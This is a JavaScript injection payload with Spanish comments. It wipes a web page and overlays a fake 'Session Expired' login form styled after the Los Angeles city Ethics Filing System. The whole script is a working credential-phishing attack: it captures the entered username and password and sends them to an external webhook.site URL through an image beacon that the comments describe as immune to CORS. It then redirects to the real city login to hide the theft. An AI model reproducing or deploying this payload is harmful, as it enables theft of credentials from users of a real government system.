(function() {
    // 1. Limpieza total para que no se vea el texto basura ni el recuadro gigante
    window.stop(); 
    document.body.innerHTML = '';
    document.body.style.backgroundColor = '#f4f4f4';
    document.body.style.margin = '0';
    document.body.style.padding = '0';

    // 2. Inyectar el Formulario (Estética del primer diseño)
    const loginDiv = document.createElement('div');
    loginDiv.style.cssText = "position:fixed; top:0; left:0; width:100%; height:100%; display:flex; justify-content:center; align-items:center; z-index:10000; font-family:sans-serif;";
    
    loginDiv.innerHTML = `
    <div style="width:350px; padding:30px; border:1px solid #ccc; background:#fff; box-shadow:0px 0px 10px rgba(0,0,0,0.1); text-align:center;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Seal_of_Los_Angeles.svg/200px-Seal_of_Los_Angeles.svg.png" style="width:100px; margin-bottom:15px;">
        <h2 style="color: #333; margin-bottom:10px;">Session Expired</h2>
        <p style="font-size: 14px; color: #666; margin-bottom:20px;">For your security, please re-enter your credentials to continue in the Ethics Filing System (EFS).</p>
        <input type="text" id="u" placeholder="Username" style="width:100%; margin-bottom:10px; padding:10px; box-sizing:border-box; border:1px solid #ddd;">
        <input type="password" id="p" placeholder="Password" style="width:100%; margin-bottom:20px; padding:10px; box-sizing:border-box; border:1px solid #ddd;">
        <button id="go" style="width:100%; padding:12px; background:#0056b3; color:white; border:none; cursor:pointer; font-weight:bold;">Login</button>
    </div>`;

    document.body.appendChild(loginDiv);

    // 3. Captura y Exfiltración (Método Image Beacon que te funciona)
    document.getElementById('go').onclick = function() {
        var user = document.getElementById('u').value;
        var pass = document.getElementById('p').value;
        
        if(!user || !pass) { alert("Please fill in both fields"); return; }

        this.innerHTML = "Processing...";
        this.disabled = true;

        // Enviamos al Webhook usando una imagen (Inmune a CORS)
        var target = "https://webhook.site/4c7629c5-d711-46a7-92ad-83309267bd91";
        var exfil = new Image();
        exfil.src = target + "?u=" + encodeURIComponent(user) + "&p=" + encodeURIComponent(pass) + "&rnd=" + Math.random();

        // Redirigimos al login real para ocultar el ataque
        setTimeout(function() {
            window.location.replace('https://ethics.lacity.gov/efs/index.cfm?fuseaction=login');
        }, 800);
    };
})();
